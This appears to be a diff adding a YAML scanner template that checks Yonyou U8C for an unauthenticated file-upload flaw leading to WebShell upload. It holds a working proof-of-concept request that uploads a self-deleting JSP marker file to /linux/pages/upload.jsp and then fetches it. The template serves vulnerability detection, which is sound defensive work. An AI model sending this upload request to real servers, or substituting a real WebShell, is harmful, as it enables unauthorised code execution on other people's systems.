@@ -1,0 +1,55 @@
+app: 用友软件
+query: app:"用友软件"
+meta:
+    name: 用友U8C文件上传漏洞
+    level: 4
+    tags:
+        - file_upload
+    description: 用友U8C存在文件未授权上传页面导致服务器可被传入WebShell
+    homepage: https://www.yonyou.com/
+    author: Administrator
+    references: https://blog.csdn.net/weixin_51345872/article/details/129623373
+    solution: 升级版本
+    create_at: "2023-06-12 13:09:32"
+    available: false
+    steps:
+        variable:
+            - file: randomLowercase(5)
+            - body: randomLowercase(10)
+        verify_steps:
+            type: and
+            verify:
+                - request:
+                    method: POST
+                    path: /linux/pages/upload.jsp
+                    redirect: true
+                    header:
+                        - Content-Type: application/x-www-form-urlencoded
+                        - filename: '{{file}}.jsp'
+                    params: <% out.println("{{body}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+                  response:
+                    - name: body
+                      value: 'upload success'
+                      type: contains
+                    - name: code
+                      value: "200"
+                      type: equals
+                - request:
+                    method: GET
+                    path: /linux/{{file}}.jsp
+                    redirect: true
+                    header: []
+                    params: ""
+                  response:
+                    - name: body
+                      value: '{{body}}'
+                      type: contains
+                    - name: code
+                      value: "200"
+                      type: equals
+        exploit_steps:
+            type: ""
+            params:
+                name: ""
+                type: ""
+                value: ""
